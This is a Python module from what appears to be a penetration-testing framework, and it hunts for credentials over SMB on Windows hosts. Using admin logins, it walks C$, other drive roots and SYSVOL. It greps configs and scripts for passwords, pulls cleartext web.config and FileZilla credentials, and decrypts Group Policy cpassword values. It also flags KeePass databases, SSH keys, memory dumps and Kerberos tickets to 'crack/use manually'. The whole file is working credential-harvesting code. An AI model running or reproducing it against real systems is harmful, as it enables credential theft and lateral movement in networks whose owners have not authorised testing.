"""Phase 3 - file hunting over SMB (needs admin on the target for C$).

Walks a few high-value locations on the target's shares and flags files that
commonly hold credentials: unattend/sysprep, web.config and app configs, scripts,
KeePass DBs, SSH/cloud/git creds, GPP Groups.xml (with cpassword auto-decrypt),
SYSVOL logon scripts. Small text files are grepped for credential keywords; the
hit (and the file path) is reported so you can pull the full file.

It ALSO sweeps every drive root (C$/D$/E$) for NON-STANDARD top-level folders -
anything that is not a default Windows directory (e.g. C:\\Backups, C:\\htb,
C:\\scripts) - and content-scans every small file inside them regardless of
extension. This is how odd files like "web.config_sample" in "C:\\Backups" get
found even though their name/path never matches the curated INTERESTING list.
The huge Windows / Program Files trees are skipped, so the sweep stays fast and
near-silent (only non-standard folders + real hits are reported).

Self-contained via impacket's SMBConnection. Fails gracefully (returns nothing)
if login fails or impacket is missing. Everything found is also summarised to the
raw output directory.
"""
from __future__ import annotations

import base64
import os
import re
from io import BytesIO
from typing import List, Tuple

from core.credential import Credential
from core.secret import Secret, Status
from .base import BaseCollector

MAX_FILE = 128 * 1024          # only read files up to 128 KB
MAX_HITS = 1000                # safety cap on total files inspected

INTERESTING = re.compile(
    r"(unattend\.xml|autounattend\.xml|sysprep\.(inf|xml)|web\.config|"
    r"applicationhost\.config|.*\.config|.*\.ps1|.*\.psm1|.*\.bat|.*\.cmd|.*\.vbs|"
    r".*\.kdbx|.*\.kdb|id_rsa|id_ed25519|id_dsa|.*\.ppk|\.git-credentials|"
    r"credentials|\.env|wp-config\.php|.*\.rdp|.*\.ini|groups\.xml|services\.xml|"
    r"scheduledtasks\.xml|datasources\.xml|.*\.ovpn|.*\.keepass|"
    r".*\.dmp|logins\.json|key4\.db|key3\.db|"
    r"signons\.sqlite|.*\.jks|.*\.pfx|.*\.p12|credentials\.xml|"
    r"recentservers\.xml|sitemanager\.xml|filezilla\.xml|superputty.*\.xml|"
    r"sessions\.xml|"
    # config backups / samples (web.config.bak, web.config_sample, app.config.old...)
    r".*\.config[._-]?\w*|.*_sample|.*_backup|.*\.bak|.*\.old|.*\.orig|.*\.save|"
    # web-app / DB config files (XAMPP/WAMP/Tomcat/Django/Spring/etc.)
    r"config\.php|config\.inc\.php|configuration\.php|database\.php|settings\.php|"
    r"dbconfig\.php|db\.php|appsettings.*\.json|standalone\.xml|context\.xml|"
    r"server\.xml|tomcat-users\.xml|application\.properties|application\.ya?ml|"
    r"settings\.py|local_settings\.py|my\.cnf|\.my\.cnf|nginx\.conf|httpd\.conf|"
    r"httpd-xampp\.conf|"
    # cloud / CLI credential stores and Kerberos tickets on disk
    r"\.pgpass|\.netrc|\.npmrc|\.pypirc|azureProfile\.json|accessTokens\.json|"
    r"\.ccache|\.kirbi|krb5cc.*)$", re.I)

CRED_KW = re.compile(
    r"(password|passwd|pwd|cpassword|secret|connectionstring|accountpassword|"
    r"-asplaintext|convertto-securestring|api[_-]?key|aws_secret|client_secret|"
    r"BEGIN [A-Z ]*PRIVATE KEY|data source|initial catalog|trusted_connection|"
    r"jdbc:|mongodb://|mysql://|postgres://|db_password|db_user|define\('DB_|pwd=)",
    re.I)

# <credentials> / <user name="x" password="y"> blocks (ASP.NET Forms auth, and
# any XML that stores a name+password pair this way). This is the exact shape of
# a web.config Forms-auth credential store - pulled out as a real cleartext cred.
CREDS_PAIR = re.compile(
    r'<user\s+[^>]*name="([^"]+)"[^>]*password="([^"]*)"', re.I)
CREDS_PAIR_REV = re.compile(
    r'<user\s+[^>]*password="([^"]*)"[^>]*name="([^"]+)"', re.I)

# files we only report the path for (binary / pull-and-process offline)
# NB: registry hives (SAM/SYSTEM/SECURITY/NTDS.dit) are intentionally NOT hunted
# here - secretsdump already pulls those hashes, so flagging the files is noise.
BINARY_LOOT = re.compile(
    r"(\.kdbx|\.kdb|id_rsa|id_ed25519|id_dsa|\.ppk|\.keepass|\.dmp|\.jks|\.pfx|"
    r"\.p12|key4\.db|key3\.db|signons\.sqlite)$", re.I)

# in the non-standard-folder sweep we scan EVERY small file, so skip obvious
# binaries up front (save the read) - anything not matched here gets content-read.
SKIP_BIN_EXT = re.compile(
    r"\.(exe|dll|sys|msi|msp|cab|zip|7z|rar|gz|tgz|tar|iso|img|vhdx?|wim|"
    r"png|jpe?g|gif|bmp|ico|tiff?|svg|webp|mp[34]|m4a|avi|mkv|mov|wmv|wav|flac|"
    r"pdb|cache|etl|evtx|bin|lib|obj|o|so|class|pyc|nupkg|"
    r"pack|idx|woff2?|ttf|otf|eot|fon|mui|ocx|cpl|drv|efi)$", re.I)

# default top-level entries on a Windows drive root - anything NOT here is treated
# as non-standard and gets swept. All lower-case for case-insensitive compare.
DEFAULT_TOPLEVEL = frozenset([
    "windows", "program files", "program files (x86)", "programdata", "users",
    "perflogs", "recovery", "$recycle.bin", "system volume information", "boot",
    "documents and settings", "msocache", "intel", "amd", "nvidia", "dell",
    "$windows.~bt", "$windows.~ws", "$getcurrent", "$sysreset", "config.msi",
    "onedrivetemp", "inetpub", "default", "public", "windows.old",
    "appdata", "drivers", "eset",
    # root files that are normal
    "pagefile.sys", "hiberfil.sys", "swapfile.sys", "dumpstack.log",
    "dumpstack.log.tmp", "bootmgr", "bootnxt", "bootsect.bak", "autoexec.bat",
    "config.sys", "io.sys", "msdos.sys", "ntldr", "ntdetect.com", "desktop.ini",
    "boottel.dat", "bootmgfw.efi",
])

# drive roots to sweep for non-standard folders (whatever we can read as admin)
DRIVE_SHARES = ("C$", "D$", "E$")
NONSTD_DEPTH = 6               # how deep to recurse inside a non-standard folder

# Microsoft-published AES key for GPP cpassword (ms-DOCS, public)
GPP_KEY = bytes.fromhex(
    "4e9906e8fcb66cc9faf49310620ffee8"
    "f496e806cc057990209b09a433b66c1b")


def _decrypt_cpassword(cpassword: str) -> str:
    try:
        from Cryptodome.Cipher import AES
    except ImportError:
        try:
            from Crypto.Cipher import AES
        except ImportError:
            return ""
    try:
        pad = "=" * (-len(cpassword) % 4)
        data = base64.b64decode(cpassword + pad)
        iv = b"\x00" * 16
        pt = AES.new(GPP_KEY, AES.MODE_CBC, iv).decrypt(data)
        return pt[: -pt[-1]].decode("utf-16-le", errors="ignore")
    except Exception:
        return ""


def _looks_binary(text: str) -> bool:
    """Rough 'is this a binary blob' check on already-decoded text, so the
    content scan does not waste time grepping executables / media that slipped
    past the extension filter. Nulls and control bytes above ~10% = binary."""
    sample = text[:4096]
    if not sample:
        return False
    bad = sum(1 for c in sample if c == "\x00" or ord(c) < 9)
    return bad > len(sample) * 0.10


class FileHuntCollector(BaseCollector):
    name = "FileHunt"
    description = ("SMB file hunt + non-standard-folder content scan: "
                   "configs/scripts/keepass/ssh/GPP (needs admin)")
    per_credential = False
    needs_admin = True             # walks C$ (local admin required)
    requires = ()                  # uses impacket as a library, not a CLI

    def collect_once(self, cred: Credential) -> List[Secret]:
        try:
            from impacket.smbconnection import SMBConnection
        except ImportError:
            return []

        try:
            conn = SMBConnection(self.host, self.host, timeout=self.timeout)
            conn.login(cred.username, cred.password or "", cred.domain,
                       cred.lmhash or "", cred.nthash or "")
        except Exception:
            return []

        found: List[Secret] = []
        self._count = 0
        log = []
        try:
            # 1) curated high-value locations (fast, targeted)
            for share, start, depth in ROOTS:
                try:
                    self._walk(conn, share, start, depth, found, log)
                except Exception as e:
                    log.append(f"[walk error] {share}\\{start}: {e}")
            # 2) sweep for non-standard top-level folders/files and scan them in full
            try:
                self._hunt_nonstandard(conn, found, log)
            except Exception as e:
                log.append(f"[nonstd error] {e}")
        finally:
            try:
                conn.logoff()
            except Exception:
                pass

        self._save_log(log)
        return found

    def _hunt_nonstandard(self, conn, found, log):
        """List each drive root, flag every entry that is not a default Windows
        directory/file, and content-scan non-standard folders in full."""
        for share in DRIVE_SHARES:
            try:
                entries = conn.listPath(share, "*")
            except Exception:
                continue                      # drive letter not present / no access
            for e in entries:
                name = e.get_longname()
                if name in (".", ".."):
                    continue
                if name.lower() in DEFAULT_TOPLEVEL:
                    continue
                loc = f"\\\\{self.host}\\{share}\\{name}"
                if e.is_directory():
                    found.append(Secret(
                        self.host, "FileHunt", "", loc, Status.INFO,
                        secret_type="dir",
                        notes="NON-STANDARD top-level folder - content-scanned"))
                    log.append(f"[nonstd-dir] {loc}")
                    self._walk(conn, share, name, NONSTD_DEPTH, found, log,
                               scan_all=True)
                else:
                    # a non-standard file sitting directly in the drive root
                    log.append(f"[nonstd-file] {loc}")
                    self._maybe_scan_file(conn, share, name, loc, found, log,
                                          size=e.get_filesize(), scan_all=True)

    def _walk(self, conn, share, path, depth, found, log, scan_all=False):
        if depth < 0 or self._count >= MAX_HITS:
            return
        try:
            entries = conn.listPath(share, (path + "\\*") if path else "*")
        except Exception:
            return
        for e in entries:
            name = e.get_longname()
            if name in (".", ".."):
                continue
            full = f"{path}\\{name}" if path else name
            if e.is_directory():
                self._walk(conn, share, full, depth - 1, found, log, scan_all)
                continue
            interesting = bool(INTERESTING.match(name))
            if not scan_all and not interesting:
                continue
            loc = f"\\\\{self.host}\\{share}\\{full}"
            self._maybe_scan_file(conn, share, full, loc, found, log,
                                  size=e.get_filesize(), scan_all=scan_all,
                                  interesting=interesting)

    def _maybe_scan_file(self, conn, share, full, loc, found, log,
                         size=0, scan_all=False, interesting=None):
        """Decide what to do with a single file: flag binary-loot by name, skip
        obvious binaries in scan_all mode, report oversized configs, else read
        and content-scan."""
        if self._count >= MAX_HITS:
            return
        name = full.rsplit("\\", 1)[-1]
        if interesting is None:
            interesting = bool(INTERESTING.match(name))

        if BINARY_LOOT.search(name):
            self._count += 1
            found.append(Secret(self.host, "FileHunt", "", loc, Status.INFO,
                                secret_type="file",
                                notes="key/DB file - pull & crack/use manually"))
            log.append(f"[binary] {loc}")
            return

        # in full-scan mode, don't even read obvious binaries we don't care about
        if scan_all and not interesting and SKIP_BIN_EXT.search(name):
            return

        self._count += 1
        if size > MAX_FILE:
            found.append(Secret(self.host, "FileHunt", "", loc, Status.INFO,
                                secret_type="file", notes="large file - review"))
            return

        data = self._read(conn, share, full)
        if data is None:
            return
        if scan_all and not interesting and _looks_binary(data):
            return
        found += self._scan(data, loc, name, log)

    def _read(self, conn, share, path):
        try:
            buf = BytesIO()
            conn.getFile(share, path, buf.write)
            return buf.getvalue().decode("utf-8", errors="ignore")
        except Exception:
            return None

    def _scan(self, text, loc, name, log) -> List[Secret]:
        out = []
        # ASP.NET Forms-auth / XML <user name=".." password=".."> cleartext creds
        for m in CREDS_PAIR.finditer(text):
            out.append(Secret(self.host, "FileHunt", m.group(1), m.group(2),
                              Status.CLEARTEXT, target=loc, secret_type="password",
                              notes="web.config <credentials> cleartext"))
        for m in CREDS_PAIR_REV.finditer(text):
            out.append(Secret(self.host, "FileHunt", m.group(2), m.group(1),
                              Status.CLEARTEXT, target=loc, secret_type="password",
                              notes="web.config <credentials> cleartext"))
        # GPP cpassword -> decrypt
        for cm in re.finditer(r'cpassword="([^"]+)"', text):
            pw = _decrypt_cpassword(cm.group(1))
            un = re.search(r'userName="([^"]+)"', text)
            out.append(Secret(self.host, "FileHunt", un.group(1) if un else "",
                              pw or cm.group(1), Status.CLEARTEXT if pw else Status.INFO,
                              target=loc, secret_type="password",
                              notes="GPP cpassword" + ("" if pw else " (decrypt failed)")))
        # FileZilla saved sessions (<Pass encoding="base64">)
        for fm in re.finditer(
                r"<Host>([^<]*)</Host>.*?<User>([^<]*)</User>.*?"
                r'<Pass[^>]*encoding="base64"[^>]*>([^<]+)</Pass>', text, re.S | re.I):
            try:
                pw = base64.b64decode(fm.group(3)).decode("utf-8", "ignore")
            except Exception:
                pw = fm.group(3)
            out.append(Secret(self.host, "FileHunt", fm.group(2), pw, Status.CLEARTEXT,
                              target=fm.group(1), secret_type="password",
                              notes="FileZilla saved session"))
        # keyword lines
        hits = 0
        for ln in text.splitlines():
            if CRED_KW.search(ln) and hits < 5:
                out.append(Secret(self.host, "FileHunt", "", ln.strip()[:140],
                                  Status.INFO, target=loc, secret_type="file-hit",
                                  notes=f"in {name}"))
                hits += 1
        if out:
            log.append(f"[hit] {loc} ({len(out)})")
        return out

    def _save_log(self, log):
        try:
            os.makedirs(self.raw_dir, exist_ok=True)
            with open(os.path.join(self.raw_dir, "FileHunt.txt"), "w",
                      encoding="utf-8", errors="ignore") as fh:
                fh.write(f"# files inspected: {self._count}\n\n")
                fh.write("\n".join(log))
        except Exception:
            pass


# (share, start_path, max_depth)
ROOTS: List[Tuple[str, str, int]] = [
    ("C$", "Windows\\Panther", 1),
    ("C$", "Windows\\System32\\sysprep", 1),
    ("C$", "Windows\\Temp", 1),                        # lsass.dmp etc.
    ("C$", "inetpub", 4),                              # IIS (whole tree, not just wwwroot)
    ("C$", "Users", 4),                                # also ~/.aws ~/.azure ~/.kube ~/.ssh .docker
    # web-server / DB install roots (XAMPP, WAMP, Apache, nginx, Tomcat, MySQL...)
    ("C$", "xampp", 5),
    ("C$", "wamp", 5),
    ("C$", "wamp64", 5),
    ("C$", "laragon", 5),
    ("C$", "Apache24", 4),
    ("C$", "nginx", 4),
    ("C$", "Program Files\\Apache Software Foundation", 5),   # Tomcat
    ("C$", "Program Files\\MySQL", 4),
    ("C$", "ProgramData\\MySQL", 4),
    ("C$", "Program Files\\MariaDB", 4),
    ("C$", "ProgramData\\MariaDB", 4),
    ("C$", "Program Files\\PostgreSQL", 4),
    ("C$", "Program Files\\Veeam", 2),
    ("C$", "Program Files\\Jenkins", 2),
    ("C$", "ProgramData\\Jenkins", 3),
    ("C$", "Program Files\\Update Services", 2),        # WSUS config
    ("C$", "Transcripts", 2),
    # locally cached GPP (survives after the GPO is deleted from SYSVOL) - holds
    # Groups.xml with cpassword; _scan auto-decrypts it like the SYSVOL copy
    ("C$", "ProgramData\\Microsoft\\Group Policy\\History", 6),
    ("SYSVOL", "", 5),
]
